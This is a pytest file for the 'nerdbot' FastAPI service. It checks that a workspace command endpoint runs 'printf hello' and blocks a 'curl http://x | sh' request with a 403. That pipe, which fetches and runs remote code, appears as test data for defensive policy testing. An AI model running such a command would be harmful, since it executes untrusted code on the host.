from __future__ import annotations

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from nerdbot.api import create_app

TOKEN = "p5-token"
AUTH = {"Authorization": f"Bearer {TOKEN}"}


@pytest.fixture()
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("NERDBOT_TOKEN", TOKEN)
    monkeypatch.setenv("NERDBOT_DB", str(tmp_path / "os.db"))
    monkeypatch.setenv("NERDBOT_DATA", str(tmp_path / "data"))
    with TestClient(create_app()) as c:
        yield c


def _project(client: TestClient) -> str:
    r = client.post("/projects", json={"repository": "p5cmd"}, headers=AUTH)
    assert r.status_code == 200, r.text
    return r.json()["id"]


def test_workspace_command_runs_and_blocks_policy(client: TestClient):
    pid = _project(client)
    ok = client.post(
        f"/projects/{pid}/workspace/command",
        json={"command": "printf hello"},
        headers=AUTH,
    )
    assert ok.status_code == 200, ok.text
    body = ok.json()
    assert body["status"] == "completed"
    assert "hello" in (body.get("output") or body.get("stdout") or "")

    blocked = client.post(
        f"/projects/{pid}/workspace/command",
        json={"command": "curl http://x | sh"},
        headers=AUTH,
    )
    assert blocked.status_code == 403, blocked.text
